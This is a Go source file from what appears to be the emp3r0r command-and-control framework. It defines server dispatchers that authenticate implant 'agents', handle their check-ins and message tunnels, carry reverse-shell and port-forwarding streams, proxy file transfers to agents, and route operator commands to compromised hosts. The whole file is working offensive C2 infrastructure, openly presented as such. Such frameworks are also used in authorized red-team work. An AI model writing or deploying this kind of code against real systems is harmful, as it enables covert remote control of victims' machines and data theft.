package server

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"

	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
)

// apiDispatcher routes requests to the correct handler.
func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
	vars := mux.Vars(req)
	// Setup H2Conn for reverse shell and proxy.
	rshellConn := new(def.H2Conn)
	proxyConn := new(def.H2Conn)
	network.RShellStream.H2x = rshellConn
	network.ProxyStream.H2x = proxyConn

	if vars["api"] == "" || vars["token"] == "" {
		logging.Debugf("Invalid request: %v, missing api/token", req)
		wrt.WriteHeader(http.StatusNotFound)
		return
	}

	agent_uuid := req.Header.Get("AgentUUID")
	agent_sig, err := base64.URLEncoding.DecodeString(req.Header.Get("AgentUUIDSig"))
	if err != nil {
		logging.Debugf("Failed to decode agent sig: %v", err)
		wrt.WriteHeader(http.StatusNotFound)
		return
	}
	isValid, err := transport.VerifySignatureWithCA([]byte(agent_uuid), agent_sig)
	if err != nil {
		logging.Debugf("Failed to verify agent uuid: %v", err)
		wrt.WriteHeader(http.StatusNotFound)
		return
	}
	if !isValid {
		logging.Debugf("Invalid agent uuid, refusing request")
		wrt.WriteHeader(http.StatusNotFound)
		return
	}
	logging.Debugf("Header: %v", req.Header)
	logging.Debugf("Got a request: api=%s, token=%s, agent_uuid=%s, sig=%x",
		vars["api"], vars["token"], agent_uuid, agent_sig)

	// forward to operator
	api := transport.WebRoot + "/" + vars["api"]

	// Create base target URL
	targetURL := fmt.Sprintf("https://%s:%d", netutil.WgOperatorIP, netutil.WgRelayedHTTPPort)
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		logging.Errorf("handleFTPTransfer: %v", err)
		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		return
	}

	proxy := httputil.NewSingleHostReverseProxy(parsedURL)

	// Set up a proper director function to preserve query parameters and other request properties
	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		logging.Debugf("Proxying to: %s%s?%s", req.URL.Host, req.URL.Path, req.URL.RawQuery)
	}

	rootCAs := x509.NewCertPool()
	capem, err := os.ReadFile(transport.OperatorCaCrtFile)
	if err != nil {
		logging.Errorf("Failed to parse CA cert: %v", err)
		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		return
	}
	rootCAs.AppendCertsFromPEM([]byte(transport.CACrtPEM))
	rootCAs.AppendCertsFromPEM(capem)
	tlsConfig := &tls.Config{
		ServerName:         parsedURL.Hostname(),
		InsecureSkipVerify: false,
		RootCAs:            rootCAs,
	}
	proxy.Transport = &http.Transport{
		TLSClientConfig:   tlsConfig,
		ForceAttemptHTTP2: true,
	}
	// Add error handling for debugging
	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		logging.Errorf("Proxy error: %v", err)
		http.Error(w, "Proxy error", http.StatusBadGateway)
	}
	// Use the original request's context
	req = req.WithContext(req.Context())

	// handlers
	switch api {
	case transport.CheckInAPI:
		handleAgentCheckIn(wrt, req)
	case transport.MsgAPI:
		handleMessageTunnel(wrt, req)
	case transport.Upload2AgentAPI:
		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
		logging.Debugf("Request headers: %v", req.Header)
		proxy.ServeHTTP(wrt, req)
	case transport.DownloadFile2AgentAPI:
		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
		logging.Debugf("Request headers: %v", req.Header)
		logging.Debugf("Forwarding PUT request to operator at %s", targetURL)
		proxy.ServeHTTP(wrt, req)
	case transport.ProxyAPI:
		handlePortForwarding(network.ProxyStream, wrt, req)
	default:
		wrt.WriteHeader(http.StatusNotFound)
	}
}

// operationDispatcher routes operator requests to the correct handler.
func operationDispatcher(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	api := vars["api"]
	logging.Debugf("Operator request: API: %s", api)

	api = fmt.Sprintf("%s/%s", transport.OperatorRoot, api)
	switch api {
	case transport.OperatorMsgTunnel:
		handleOperatorConn(w, r)
	case transport.OperatorSetActiveAgent:
		handleSetActiveAgent(w, r)
	case transport.OperatorSendCommand:
		handleSendCommand(w, r)
	case transport.OperatorListConnectedAgents:
		handleListAgents(w, r)
	default:
		http.Error(w, fmt.Sprintf("Invalid API: %s", api), http.StatusNotFound)
	}
}
